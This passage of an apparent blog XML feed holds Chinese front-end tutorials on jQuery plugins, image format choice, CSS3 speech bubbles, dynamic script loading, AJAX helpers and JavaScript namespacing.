inline-block;position: relative;&#125;.slider-date .slider-bg li &#123;position: relative;float: left;width: 50px;border-left: solid 1px #ddd;font-size: 12px;text-align: center;&#125;.slider-date .slider-bg span &#123;display: none;&#125;.slider-date .slider-bg li:first-child &#123;border-left: none;&#125;.slider-date .slider-bar &#123;position: absolute;top: -2px;left: 0;overflow: hidden;height: 40px;width: 50px;&#125;.slider-date .slider-bar ul &#123;margin-top: 1px;background: #43bfe3;color: #fff;height: 36px;width: 1000px;&#125;.slider-date .slider-bar-btn &#123;line-height: 40px;text-align: center;position: absolute;top: -2px;right: 0px;display: block;width: 16px;height: 40px;background: #2dacd1;color: #fff;&#125;.slider-date .slider-bar-btn i &#123;display: inline-block;margin: 12px 2px;width: 2px;height: 12px;background: #68c3de;&#125;js代码：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485//滑动插件 by - mantou qq:676015863; (function ($) &#123;$.fn.sliderDate = function (setting) &#123;var defaults = &#123;callback: false //默认回调函数为false&#125;//如果setting为空，就取default的值var setting = $.extend(defaults, setting);this.each(function () &#123;//插件实现代码//var $sliderDate = $(".slider-date");var $sliderDate = $(this);var $sliderBar = $sliderDate.find(".slider-bar");var $sliderBtn = $sliderDate.find(".slider-bar-btn");var liWid = 50 + 1; //单个li的宽度//滚动指定的位置var sliderToDes = function (index) &#123;//最大不能超过11if (index &gt; 11) &#123;index = 11;&#125;//最小不能小于 0if (index &lt; 0) &#123;index = 0;&#125;//背景动画$sliderBar.animate(&#123;"width": liWid * (index + 1)&#125;, 500);//执行回调if (setting.callback) &#123;setting.callback(index);&#125;&#125;;//点击 - 滚动到指定位置$sliderDate.on('click', "li", function (e) &#123;//执行滚动方法sliderToDes($(this).index());&#125;);//拖动 - 滚动到指定位置$sliderBtn.on('mousedown', function (e) &#123;var $this = $(this);var pointX = e.pageX - $this.parent().width();var wid = null;//拖动事件$(document).on('mousemove', function (ev) &#123;wid = ev.pageX - pointXif (wid &gt; 20 &amp;amp;&amp;amp; wid &lt; 620) &#123;$sliderBar.css("width", wid);&#125;&#125;).on('mouseup', function (e) &#123;$(this).off('mousemove mouseup');var index = Math.ceil(wid / liWid) - 1;sliderToDes(index);&#125;);&#125;);&#125;);&#125;&#125;)(jQuery);$(function () &#123;function a(index) &#123;console.log(index + 1);&#125;$("#slider-date-1").sliderDate(&#123; callback: a &#125;);function b(index) &#123;console.log(index + 1);&#125;$("#slider-date-2").sliderDate(&#123; callback: b &#125;);function c(index) &#123;console.log(index + 1);&#125;$("#slider-date-3").sliderDate(&#123; callback: c &#125;);&#125;);查看演示点击下载]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>jq日期选择</tag>
        <tag>sidebarDateSelect</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端开发中图片格式的选择总结]]></title>
    <url>%2F2015%2F09%2F14%2F%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E4%B8%AD%E5%9B%BE%E7%89%87%E6%A0%BC%E5%BC%8F%E7%9A%84%E9%80%89%E6%8B%A9%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[图片问题的一些总结&emsp;&emsp;前言： 之前个人对于图片的问题，一直还是显得不是很重视。但其实对于互联网来说，可能图片的内容已经占据了整个互联网的大半部分，因此我们很大一部分流量的消耗，都是用在了图片上面，因此，对于图片有一些认识肯定是现在所必须的。所以趁今天这个不太忙的机会，打算对于图片的问题做一个简单地总结，也算是对之前没掌握到的东西的一个学习与备忘过程。常见的图片格式&emsp;&emsp;APNG，作为想取代gif的新格式，他比我们常用的gif更为优秀。从其名称中可以看出，APNG其实可以说是会动png，因为png支持24位的颜色，而gif最多仅支持8位的颜色，因此，APNG的显示效果比gif更为清晰。可惜APNG并没有加入png标准，因此我们日常生产中很难将其纳入使用。&emsp;&emsp;WebP，是由谷歌推出的图片格式，想让其作为web中专用的图片格式。与jpg作对比，WebP有对透明的支持，以及完全不亚于JPG的压缩率。而与PNG对比，WebP更小，加载更快。不过可惜的是，其兼容性也是不太友好。&emsp;&emsp;上面两种格式，因为使用不太多，因此仅仅提及一下。下面将对我们常用的JPG，PNG，以及GIF来做讨论。JPG由于jpg的压缩方式为有损，而我们之前有提及到，图片所消耗的流量已经占据了互联网的半壁江山，因此，jpg自然就成为了web开发中的宠儿。对于图片中，没有透明效果的，以及图片更为颜色丰富的图片，我们多可以采用压缩60%-80%的jpg图像。这样可以保证使得图片更小，网页加载更快。不过需要注意的是jpg的每一次压缩，对图片都是有损的。因此，对于一些有线条，或者文字的图片，jpg压缩之后，看起来并不理想，因此，在这种情况下，应该尽量避免对jpg的使用GIFGIF仅有256种颜色，并且对透明对支持仅仅局限于全透明或者不透明，因此，gif若作为非动图来说，只能用于颜色不太复杂的图片。不过一般来说，我们用gif都是由于其对动画的友好支持，在APNG兼容性十分不友好的情况下，如果仅仅想引入一个动图的话，gif是目前很好的选择。PNG格式png的格式可以分为以上几种，而我们常用的便是png8与png32了（即是我们常在ps中导出的png24）透明png32&emsp;&emsp;我们在ps中导出的png24勾上透明选项后，即是这里所说的png32了，而png32实际上是指的png24位的深度，以及8位的alpha透明通道。因为png32颜色的丰富性（2^24种颜色）,以及对各种透明的友好支持。png32是我们许多人最常用的格式之一。其导出方法也很简单，只用在ps中选择导出为web所用格式，选中png24+透明即可。然而png32在ie6上并不能表现为透明png24&emsp;&emsp;其实png24本身是不透明的，因为其并没有那8位的alpha通道。在fireworks中我们可以很好地看到这一特点图中下面为png32，上面为png24png8&emsp;&emsp;png8由于仅有2^8种颜色，因此体积较小，同时，他还对透明有比较友好的支持，因此，png8也是很多人喜欢使用的图片格式。png8+alpha透明png8的alpha透明，由于不能够使用ps来进行导出，因此我们需要使用fireworks来导出。这次，我选择了一张黑色的透明背景来对透明的支持做一次比对图中下为png32，上为png8+alpha透明&emsp;&emsp;可以看出，png8对于半透明，有不错的支持性。同时，因为其比较小的体积。在现代浏览器上，对于颜色不太复杂的小按钮之类的的东西，以及对于图片的要求并没有那么高的移动端端来说png+alpha透明也是显得十分友好的。当然，对于颜色较为复杂，以及要求较为严格的pc端上需要采用的东西，我认为还是应该采用png32的好。不过alpha透明的png8在ie6上的表现并不如人意，在ie6上，其半透明处会以全透明来显示，并且毛边严重。之前也提及到了，png8的alpha透明对于半透明，只是有不错的支持性，其真正的表现事实上还是不如png32。在我测试过程中发现，png8采用alpha透明，依然会出现一些毛边比对可以发现，上面png8+alpha透明的图片比起下面png32的图片还是多了一些锯齿。不过整体影响不算太大。png8+索引透明&emsp;&emsp;png8的索引透明终于可以用ps来进行导出了，导出方式也很简单。导出的时候直接选择ps的png8或者ps预设的png-8 128仿色。此时我们就可以导出索引透明的png8了。如下图&emsp;&emsp;从上面的图可以看到，我们将导出图片，四周部分变为了白色（当然，你一打开看到的也可能是没有白边的）。这个时候，把图片右边那个杂边改为无，就可以去掉图片的白边。如下&emsp;&emsp;左边的png32的图与右边png8的图对比可以看出，右边的图明显有一些锯齿。原因是索引透明对于透明的支持并不完善，其仅仅支持全透明以及全不透明，而不支持半透明。当选择了杂边为无的时候，所有的半透明转换为了不透明，也就产生了锯齿。那如何解决这些锯齿呢？&emsp;&emsp;刚刚将四周白色，变为无的杂边的选项，其实就是ps对于锯齿的一个解决方法。如果这张图的需求是在纯色的背景下的话，我们可以将杂边，改为该图在网页中所在的背景的颜色，以做到在视觉上的一种无锯齿的感觉。这种方案在ie6下也可以很好地实现，不过也有他的局限性——倘若背景颜色比较复杂，那么这种方案将会无效。]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>切图 图片格式的选择</tag>
        <tag>前端 图片格式的选择</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JQ使用CSS3实现动感十足的文字动画效果插件Textillate.js]]></title>
    <url>%2F2015%2F09%2F14%2Fjq%E4%BD%BF%E7%94%A8css3%E5%AE%9E%E7%8E%B0%E5%8A%A8%E6%84%9F%E5%8D%81%E8%B6%B3%E7%9A%84%E6%96%87%E5%AD%97%E5%8A%A8%E7%94%BB%E6%95%88%E6%9E%9C%E6%8F%92%E4%BB%B6textillate-js%2F</url>
    <content type="text"><![CDATA[Textillate是一款基于jquery的使用CSS3实现文字动画的小巧插件。Textillate.js集成了一些很棒的使用CSS3动画效果的 JavaScript 库，您可非常轻轻松地把这些动画效果应该于网页中的任何文字。参数选项：事件start.tlt – textillate开始时触发inAnimationBegin.tlt – 动画进入开始时触发inAnimationEnd.tlt – 动画进入结束时触发outAnimationBegin.tlt – 动画退出开始时触发outAnimationEnd.tlt – 动画退出结束时触发end.tlt – ttextillate结束触发方法$element.textillate(‘start’) – 手动开始或重启 textillate$element.textillate(‘stop’) – 手动暂停或停止 textillate$element.textillate(‘in’) – 当前文字动画进入时触发$element.textillate(‘out’) – 当前文字动画退出时触发查看演示点击下载&nbsp;]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>Textillate.js</tag>
        <tag>文字动画效果</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[30种奇妙的鼠标悬停效果【附源码下载】]]></title>
    <url>%2F2015%2F09%2F13%2F30%E7%A7%8D%E5%A5%87%E5%A6%99%E7%9A%84%E9%BC%A0%E6%A0%87%E6%82%AC%E5%81%9C%E6%95%88%E6%9E%9C%E3%80%90%E9%99%84%E6%BA%90%E7%A0%81%E4%B8%8B%E8%BD%BD%E3%80%91%2F</url>
    <content type="text"><![CDATA[Web 界面上交互的方式很多，只要你去探索，你会发现很多让你眼前一亮的想法。Codrops 最近发布了一组悬停效果，总共分为两组，多达30种不同的风格。为了让效果尽可能的平滑，最好不要在元素上使用变换以免影响布局。第二组效果中采用了 SVG 动画，这也是目前比较流行的方式。温馨提示：为保证最佳的效果，请在 IE10+、Chrome、Firefox 和 Safari 等现代浏览器中浏览。查看演示点击下载&nbsp;]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>HoverEffectIdeas</tag>
        <tag>鼠标悬停效果</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSS3实现气泡效果]]></title>
    <url>%2F2015%2F09%2F13%2Fcss3%E5%AE%9E%E7%8E%B0%E6%B0%94%E6%B3%A1%E6%95%88%E6%9E%9C%2F</url>
    <content type="text"><![CDATA[先看下最终实现的效果：首先定义一个1&lt;p class="speech"&gt;&lt;/p&gt;先给外层的容器添加样式：12345678910111213141516p.speech&#123;position: relative;width: 200px;height: 100px;text-align: center;line-height: 100px;background-color: #fff;border: 8px solid #666;-webkit-border-radius: 30px;-moz-border-radius: 30px;border-radius: 30px;-webkit-box-shadow: 2px 2px 4px #888;-moz-box-shadow: 2px 2px 4px #888;box-shadow: 2px 2px 4px #888;&#125;没有什么特别复杂的，主要的核心就在postion:relative，用来定位对话浮层的。我们还需要一些Mozilla和webkit的属性来完成圆角和阴影，IE8以下的浏览器看不到这些属性，只是显示一个框，不影响总体的效果。我们现在需要创建对话浮层下面的那个三角形的指向标志了。不使用图片，我们使用CSS边框来完成这个效果。看看下面这个用不同颜色边框完成的效果。我们把高度和宽度减少到0px，然后给边框使用不同的大小，看看效果：为了最后能做成指示标志的样子，我们把上边距和左边距设置为solid，下边距和右边距设置为透明：但是我们把这个放哪呢？还好，我们可以使用CSS的伪类:before和:after来生成，所以：1234567891011p.speech:before&#123;content: ' ';position: absolute;width: 0;height: 0;left: 30px;top: 100px;border: 25px solid;border-color: #666 transparent transparent #666;&#125;现在三角形的标识就定位在我们的气泡下面了。另外，不要费事去考虑这个元素的阴影，他会定位在透明边界的旁边，而不是看到的图形的旁边。我们还需要移除三角形的一部分。我们可以在里面放置一个白色的小三角形来达到这个效果。1234567891011p.speech:after&#123;content: ' ';position: absolute;width: 0;height: 0;left: 38px;top: 100px;border: 15px solid;border-color: #fff transparent transparent #fff;&#125;我们的不使用图片的对话气泡就完成了：另外，我们还可以使用:before和:after伪类来做很多其他的事情，比如，一个思考气泡也可以通过这样办法完成：首先也是建一个1&lt;p class="thought"&gt;I think...&lt;/p&gt;css代码：1234567891011121314151617181920212223242526272829303132333435363738394041p.thought&#123;position: relative;width: 130px;height: 100px;text-align: center;line-height: 100px;background-color: #fff;border: 8px solid #666;-webkit-border-radius: 58px;-moz-border-radius: 58px;border-radius: 58px;-webkit-box-shadow: 2px 2px 4px #888;-moz-box-shadow: 2px 2px 4px #888;box-shadow: 2px 2px 4px #888;&#125;p.thought:before, p.thought:after&#123;content: '';position: absolute;left: 10px;top: 70px;width: 40px;height: 40px;background-color: #fff;border: 8px solid #666;-webkit-border-radius: 28px;-moz-border-radius: 28px;border-radius: 28px;z-index:5;&#125;p.thought:after&#123;position: absolute;width: 20px;height: 20px;left: 5px;top: 100px;-webkit-border-radius: 18px;-moz-border-radius: 18px;border-radius: 18px;z-index:6;&#125;最新实现效果：]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>CSS3 气泡效果</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js如何判断引入的js文件是否加载完毕]]></title>
    <url>%2F2015%2F09%2F13%2Fjs%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E5%BC%95%E5%85%A5%E7%9A%84js%E6%96%87%E4%BB%B6%E6%98%AF%E5%90%A6%E5%8A%A0%E8%BD%BD%E5%AE%8C%E6%AF%95%2F</url>
    <content type="text"><![CDATA[如果javascript代码较少的话完全可以将js代码通过&lt;script&gt;&lt;/script&gt;标签写在当前页面，但是如果js代码非常庞大的话，那么页面将会变得非常的臃肿，并且由于js代码是同步加载，所以当js代码加载的时候，会阻塞下面内容的解析，所以最好能够动态加载js功能，尤其是能够实现根据需要动态引入外部js文件。由于动态加载js文件是异步的，所以有时候需要判断js文件是否加载完毕，下面就通过代码介绍一下如何实现判断功能。代码如下:123456789101112131415161718function dynamicLoad()&#123;//此函数实现判断指定文件是否加载完毕的功能。 var _doc=document.getElementsByTagName('head')[0];//获取head头部标签元素对象。 var script=document.createElement('script');//创建一个script标签元素。 script.setAttribute('type','text/javascript');//设置script标签的type属性。 script.setAttribute('src','jquery-1.8.3.js');//设置script标签的src属性值，也就是要加载js文件的路径。 _doc.appendChild(script);//将script标签附加到head标签中，否则只能够在IE11以下浏览器能够完成判断。 script.onload=script.onreadystatechange=function()&#123; if(!this.readyState||this.readyState=='loaded'||this.readyState=='complete')&#123; alert('done'); &#125; script.onload=script.onreadystatechange=null;//删除事件处理函数。 &#125; //下面介绍一下上面代码的相关原理: //IE8和IE8以下浏览器中，script标签并不支持onload事件，但是支持onreadystatechange事件。 //IE8以上浏览器、谷歌浏览器和火狐浏览器支持onload事件。 //readyState是onreadystatechange事件的一个状态，当值为loaded或者complete的时候，都表示已经加载完毕。 //if(!this.readyState||this.readyState=='loaded'||this.readyState=='complete')，!this.readyState表示不是不是IE11以下浏览器（IE11以下浏览器也是支持onreadystatechange事件的）&#125;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>判断js文件是否加载完毕</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ajax请求且带返回值的代码实例]]></title>
    <url>%2F2015%2F09%2F13%2Fajax%E8%AF%B7%E6%B1%82%E4%B8%94%E5%B8%A6%E8%BF%94%E5%9B%9E%E5%80%BC%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%9E%E4%BE%8B%2F</url>
    <content type="text"><![CDATA[经常使用jquery的ajax来实现一些无刷新请求效果，本次提供一个非常简单的代码实例供大家参考之用，希望能够给需要的朋友带来一定的帮助，代码如下:12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;script type="text/javascript"&gt;/* 请求Ajax 带返回值，并弹出提示框提醒*/function getAjax(url,parm,callBack)&#123;$.ajax(&#123;type:'post',dataType:"text",url:url,data:parm,cache:false,async:false,success:function (msg) &#123;callBack(msg);&#125;&#125;)&#125;/*删除*//*url: 表示请求路径*/function DeleteData(url,id)&#123;var parm='active=Del&amp;amp;id='+id;if(id==undefined||id=="")&#123;showAlertMsg('请选择要删除一行');&#125;else&#123;showConfirmMsg("此操作不可恢复，确定要删除吗？",function(r)&#123;if(r)&#123;getAjax(url,parm,function(rs)&#123;if(parseInt(rs)&gt;0)&#123;showOverAlertMsg("删除成功！",2000,4);&#125;else if(parseInt(rs) == 0)&#123;showOverAlertMsg("该数据被关联,无法删除！",2000,3);&#125;else&#123;showOverAlertMsg("删除失败！", 2000, 5);&#125;&#125;)&#125;&#125;)&#125;&#125;//删除function DeleteOnclick()&#123;DeleteData('SysMenu_List.aspx', Menu_Id);&#125;&lt;/script&gt;以上代码实现了标题中所说的功能，代码非常的简单，这里就不多介绍了。&nbsp;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>ajax 返回值</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[disabled和readonly的区别]]></title>
    <url>%2F2015%2F09%2F13%2Fdisabled%E5%92%8Creadonly%E7%9A%84%E5%8C%BA%E5%88%AB%2F</url>
    <content type="text"><![CDATA[disabled和readonly的区别是什么:这两个属性有类似之处，但是区别也是巨大的，之所以说类似，是因为这两个属性好像都貌似能够将指定的元素设置为”不可用”状态，下面就简单介绍一下它们两个的区别,希望能够给大家带来一定的帮助。一.作用范围不同:disabled属性可以用语所有的表单元素。readonly属性只对&lt;input type=&quot;text&quot;&gt;、&lt;textarea&gt;和&lt;input type=&quot;password&quot;&gt;有效。二.对元素的影响程度不同:disabled属性阻止对元素的一切操作，例如获取焦点，点击事件等等。readonly属性只是将元素设置为只读，其他操作正常。三.表达提交:disabled属性可以让表单元素的值无法被提交。readonly属性则不影响提交问题。]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>disabled和readonly的区别</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何避免javascript中的冲突]]></title>
    <url>%2F2015%2F09%2F10%2F%E5%A6%82%E4%BD%95%E9%81%BF%E5%85%8Djavascript%E4%B8%AD%E7%9A%84%E5%86%B2%E7%AA%81%2F</url>
    <content type="text"><![CDATA[==[1]工程师甲编写功能A==123var a = 1;var b = 2;alert(a+b);//3==[2]工程师乙添加新功能B==123var a = 2;var b = 1;alert(a-b);//1==[3]上一步中,工程师乙在不知情的情况下,定义了同名变量a,产生冲突。于是使用匿名函数将脚本包起来,让变量作用域控制在匿名函数之内。==123456789101112//功能A(function()&#123; var a = 1; var b = 2; alert(a+b);//3&#125;)();//功能B(function()&#123; var a = 2; var b = 1; alert(a-b);//1&#125;)();==[4]此时有了新需求,网页中加入功能C,且需要用到功能A中的变量b。于是在window作用域下定义一个全局变量,把它作为一个桥梁,完成各匿名函数之间的通信==123456789101112131415161718192021//全局变量var str;//功能A(function()&#123; var a = 1; //将b的值赋给str var b = str = 2; alert(a+b);//3&#125;)();//功能B(function()&#123; var a = 2; var b = 1; alert(a-b);//1&#125;)();//功能C(function()&#123; //将str的值赋给b var b = str; alert(b);//2&#125;)();==[5]但如果功能C还需要功能A中的变量a呢,这时就需要再定义一个全局变量==123456789101112131415161718192021222324//全局变量var str,str1;//功能A(function()&#123; //将a的值赋给str1 var a = str1 = 1; //将b的值赋给str var b = str = 2; alert(a+b);//3&#125;)();//功能B(function()&#123; var a = 2; var b = 1; alert(a-b);//1&#125;)();//功能C(function()&#123; //将str1的值赋给a var a = str1; //将str的值赋给b var b = str; alert(a*b);//2&#125;)();==[6]但随着匿名函数之间需要通信的变量越多,需要的全局变量也就越多。因此需要严格控制全局变量的数量,使用hash对象作为全局变量,可以将需要的变量都作为对象的属性,可以保证全局变量的个数足够少,同时拓展性非常好==123456789101112131415161718192021222324//全局变量var GLOBAL = &#123;&#125;;//功能A(function()&#123; //将a的值赋给GLOBAL.str1 var a = GLOBAL.str1 = 1; //将b的值赋给GLOBAL.str var b = GLOBAL.str = 2; alert(a+b);//3&#125;)();//功能B(function()&#123; var a = 2; var b = 1; alert(a-b);//1&#125;)();//功能C(function()&#123; //将GLOBAL.str1的值赋给a var a = GLOBAL.str1; //将GLOBAL.str的值赋给b var b = GLOBAL.str; alert(a*b);//2&#125;)();==[7]但如果新增功能D,功能D需要和功能B通信,并使用功能B脚本中的变量a,开发功能D的是工程师丁==12345678910111213141516171819202122232425262728293031//全局变量var GLOBAL = &#123;&#125;;//功能A(function()&#123; //将a的值赋给GLOBAL.str1 var a = GLOBAL.str1 = 1; //将b的值赋给GLOBAL.str var b = GLOBAL.str = 2; alert(a+b);//3&#125;)();//功能B(function()&#123; //将a的值赋给GLOBAL.str1 var a = GLOBAL.str1 = 2; var b = 1; alert(a-b);//1&#125;)();//功能C(function()&#123; //将GLOBAL.str1的值赋给a var a = GLOBAL.str1; //将GLOBAL.str的值赋给b var b = GLOBAL.str; alert(a*b);//2&#125;)();//功能D(function()&#123; //将GLOBAL.str1的值赋给a var a = GLOBAL.str1; alert(a*2);//4&#125;)();==[8]由于工程师丁只关心自己的匿名函数和功能B的匿名函数，使用GLOBAL.str却无意中覆盖了功能A中设置的同名变量,导致功能C出错。于是使用命名空间来解决这个问题，在不同的匿名函数下,根据功能声明一个不同的命名空间,然后每个匿名函数中的GLOBAL对象的属性都不要直接挂在GLOBAL对象上,而是挂在此匿名函数的命名空间下==123456789101112131415161718192021222324252627282930313233//全局变量var GLOBAL = &#123;&#125;;//功能A(function()&#123; GLOBAL.A = &#123;&#125;; //将a的值赋给GLOBAL.A.str1 var a = GLOBAL.A.str1 = 1; //将b的值赋给GLOBAL.A.str var b = GLOBAL.A.str = 2; alert(a+b);//3&#125;)();//功能B(function()&#123; GLOBAL.B = &#123;&#125;; //将a的值赋给GLOBAL.B.str1 var a = GLOBAL.B.str1 = 2; var b = 1; alert(a-b);//1&#125;)();//功能C(function()&#123; //将GLOBAL.A.str1的值赋给a var a = GLOBAL.A.str1; //将GLOBAL.A.str的值赋给b var b = GLOBAL.A.str; alert(a*b);//2&#125;)();//功能D(function()&#123; //将GLOBAL.B.str1的值赋给a var a = GLOBAL.B.str1; alert(a*2);//4&#125;)();==[9]如果同一个匿名函数中的程序非常复杂,变量名很多,命名空间还可以进一步拓展,生成二级命名空间==123456789101112//以功能A为例(function()&#123; var a = 1, b = 2; GLOBAL.A = &#123;&#125;; GLOBAL.A.CAT = &#123;&#125;; GLOBAL.A.DOG = &#123;&#125;; GLOBAL.A.CAT.name = 'mimi'; GLOBAL.A.DOG.name = 'xiaobai'; GLOBAL.A.CAT.move = function()&#123;&#125;; GLOBAL.A.str1 = a; GLOBAL.B.str = b; &#125;)();==[10]因为生成命名空间是个非常常用的功能,进一步将生成命名空间的功能定义成一个函数,方便调用,完整版本改写后的代码如下==1234567891011121314151617181920212223242526272829303132333435363738394041424344454647var GLOBAL = &#123;&#125;;GLOBAL.namespace = function(str)&#123; var arr = str.split('.'); var o = GLOBAL; var start = 0; if(arr[0] == 'GLOBAL')&#123; start = 1; &#125;else&#123; start = 0; &#125; for(var i = start; i &lt; arr.length; i++)&#123; o[arr[i]] = o[arr[i]] || &#123;&#125;; o = o[arr[i]]; &#125;&#125;;//功能A(function()&#123; var a = 1; var b = 2; GLOBAL.namespace = &#123;'A.CAT'&#125;; GLOBAL.namespace = &#123;'A.DOG'&#125;; GLOBAL.A.CAT.name = 'mimi'; GLOBAL.A.DOG.name = 'xiaobai'; GLOBAL.A.CAT.move = function()&#123;&#125;; GLOBAL.A.str1 = a; GLOBAL.B.str = b; alert(a+b);//3&#125;)();//功能B(function()&#123; var a = 2; var b = 1; GLOBAL.namespace = &#123;'B'&#125;; GLOBAL.B.str1 = a; alert(a-b);//1&#125;)();//功能C(function()&#123; var a = GLOBAL.A.str1; var b = GLOBAL.A.str; alert(a*b);//2&#125;)();//功能D(function()&#123; var a = GLOBAL.B.str1; alert(a*2);//4&#125;)();==[11]代码的冲突问题已经解决了,但可维护性并不强。比如,现在需要让工程师甲去修改功能B。因为工程师甲写的脚本是关于功能A的,他并不知道功能B的脚本情况。为了改善这种局面,需要给代码添加适当的注释。==1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768var GLOBAL = &#123;&#125;;GLOBAL.namespace = function(str)&#123; var arr = str.split('.'); var o = GLOBAL; var start = 0; if(arr[0] == 'GLOBAL')&#123; start = 1; &#125;else&#123; start = 0; &#125; for(var i = start; i &lt; arr.length; i++)&#123; o[arr[i]] = o[arr[i]] || &#123;&#125;; o = o[arr[i]]; &#125;&#125;;/** @method 功能A:实现加法运算* @author 工程师甲* @connect 1234567* @time 2015-01-01*/(function()&#123; var a = 1; var b = 2; GLOBAL.namespace = &#123;'A.CAT'&#125;; GLOBAL.namespace = &#123;'A.DOG'&#125;; GLOBAL.A.CAT.name = 'mimi'; GLOBAL.A.DOG.name = 'xiaobai'; GLOBAL.A.CAT.move = function()&#123;&#125;; GLOBAL.A.str1 = a; GLOBAL.B.str = b; alert(a+b);//3&#125;)();/** @method 功能B:实现减法运算* @author 工程师乙* @connect 1234567* @time 2015-01-01*/(function()&#123; var a = 2; var b = 1; GLOBAL.namespace = &#123;'B'&#125;; GLOBAL.B.str1 = a; alert(a-b);//1&#125;)();/** @method 功能C:实现乘法运算* @author 工程师丙* @connect 1234567* @time 2015-01-01*/(function()&#123; var a = GLOBAL.A.str1; var b = GLOBAL.A.str; alert(a*b);//2&#125;)();/** @method 功能D:实现乘2运算* @author 工程师丁* @connect 1234567* @time 2015-01-01*/(function()&#123; var a = GLOBAL.B.str1; alert(a*2);//4&#125;)();让javascript不再冲突,需要[1]避免全局变量的泛滥[2]合理使用命名空间[3]为代码添加必要的注释]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>如何避免js中的冲突</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[页面滚动元素进入视口发生动画特效插件]]></title>
    <url>%2F2015%2F09%2F10%2F%E9%A1%B5%E9%9D%A2%E6%BB%9A%E5%8A%A8%E5%85%83%E7%B4%A0%E8%BF%9B%E5%85%A5%E8%A7%86%E5%8F%A3%E5%8F%91%E7%94%9F%E5%8A%A8%E7%94%BB%E7%89%B9%E6%95%88%E6%8F%92%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;jquery-aniview是一款非常实用的页面滚动元素进入视口发生动画特效jQuery插件。该插件基于[animate.css]，你可以使用[animate.css]中所有的动画过渡效果。该插件会检测指定元素是否进入视口，在元素进入视口时则执行指定的动画效果。使用方法&emsp;&emsp;使用jquery-aniview插件需要引入animate.css，jQuery和jquery.aniview.min.js文件123&lt;link type="text/css" rel="stylesheet" href="animate.css"&gt;&lt;script src="js/jquery.min.js" type="text/javascript"&gt;&lt;/script&gt;&lt;script src="jquery.aniview.min.js" type="text/javascript"&gt;&lt;/script&gt;HTML结构&emsp;&emsp;可以使用一个来作为动画元素的包裹元素。为该元素设置class为aniview，av-animation用于设置animate.css的动画过渡效果的class名称：一个典型页面的例子应该像下面这样：123456789101112131415161718192021222324&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset="utf-8"&gt;&lt;meta http-equiv="X-UA-Compatible" content="IE=edge"&gt;&lt;meta name="viewport" content="width=device-width, initial-scale=1.0" /&gt;&lt;title&gt;My AniView Page&lt;/title&gt;&lt;link type="text/css" rel="stylesheet" href="animate.css"&gt;&lt;script type="text/javascript" src="jquery.min.js"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="jquery.aniview.min.js"&gt;&lt;/script&gt;&lt;script&gt;$(document).ready(function()&#123;$('.aniview').AniView();&#125;);&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div&gt;&lt;p class="aniview" av-animation="slideInRight"&gt;This is my awesome animated element!&lt;/p&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;初始化插件&emsp;&emsp;在页面DOM元素加载完毕之后，可以通过下面的方法来初始化该插件。1$('.aniview').AniView();或者在初始化的时候设置一些配置参数：options = &#123;1234animateThreshold: 100,scrollPollInterval: 50&#125;$(&apos;.aniview&apos;).AniView(options);配置参数:参数 1类型描述默认值animateThresholdint正数值表示元素进入视口指定的像素值之后才会触发动画序列，负数值表示在元素进入视口之前多少像素就触发动画序列0scrollPollIntervalint测试用户滚动的频率。单位毫秒，这是jQuery内置的”scroll”事件的延伸20注意：任何在页面加载时就处于视口当中的元素会立刻被触发动画序列。查看演示点击下载&nbsp;]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>js进入视口动画特效</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基于jQuery右下角旋转环状菜单代码]]></title>
    <url>%2F2015%2F09%2F10%2F%E5%9F%BA%E4%BA%8Ejquery%E5%8F%B3%E4%B8%8B%E8%A7%92%E6%97%8B%E8%BD%AC%E7%8E%AF%E7%8A%B6%E8%8F%9C%E5%8D%95%E4%BB%A3%E7%A0%81%2F</url>
